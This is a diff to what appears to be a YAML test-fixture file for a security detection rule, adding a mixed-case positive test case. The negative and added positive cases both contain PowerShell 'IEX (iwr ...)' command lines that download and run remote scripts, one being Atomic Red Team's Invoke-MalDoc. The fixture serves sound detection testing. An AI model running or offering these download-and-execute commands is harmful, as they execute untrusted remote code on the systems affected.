@@ -28,3 +28,8 @@ negative:
     <<: *ev
     process.command_line: |-
       powershell.exe -c "IEX (iwr https://raw.githubusercontent.com/x/y/z.ps1)"
+recased_positive:
+- name: "lower-case iex / invoke-maldoc / upper-case host"
+  event:
+    <<: *ev
+    process.command_line: "powershell.exe -c \"iex (iwr https://RAW.GITHUBUSERCONTENT.COM/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing); invoke-maldoc\""
